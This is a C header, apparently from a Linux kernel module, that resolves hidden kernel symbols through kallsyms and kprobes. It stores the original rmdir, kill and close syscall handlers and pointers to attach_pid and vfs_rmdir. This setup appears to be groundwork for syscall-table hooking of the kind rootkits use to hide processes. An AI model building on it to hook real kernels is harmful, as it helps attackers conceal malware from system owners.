#ifndef __KERNEL_ADDR_H
#define __KERNEL_ADDR_H
#include <linux/version.h>
#include <linux/kallsyms.h>
#include <linux/kernel_stat.h>
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
#include <linux/kprobes.h>
#endif

struct kernel_syscalls {
    asmlinkage long (*o_sys_rmdir) (const char __user *);
    asmlinkage long (*o_sys_kill) (pid_t, int);
    asmlinkage long (*o_sys_close) (unsigned int);
};

typedef unsigned long (*kallsyms_lookup_name_t)(const char *);
static kallsyms_lookup_name_t kallsyms_lookup_name_ptr;

static inline unsigned long
kall_load(const char* objname)
{
    return kallsyms_lookup_name_ptr(objname);
}

#if LINUX_VERSION_CODE < KERNEL_VERSION(3,11,0)
#define ATTACH_PID_SGN (struct task_struct *, enum pid_type, struct pid *)
#else
#define ATTACH_PID_SGN (struct task_struct *, enum pid_type)
#endif
#define VFS_RMDIR_SGN (struct inode *, struct dentry *)

#define K_FUNC_FACTORY(ret, name, sgn) ret (*k_##name) sgn
#define K_FUNC_FACTORY_LOAD(ret, name, sgn) k_##name = (ret(*)sgn)kall_load(#name)

K_FUNC_FACTORY(extern void, attach_pid, ATTACH_PID_SGN);
K_FUNC_FACTORY(extern void, vfs_rmdir, VFS_RMDIR_SGN);

void kall_load_addr(void);
struct kernel_syscalls *kall_syscall_table_load(void);

#endif
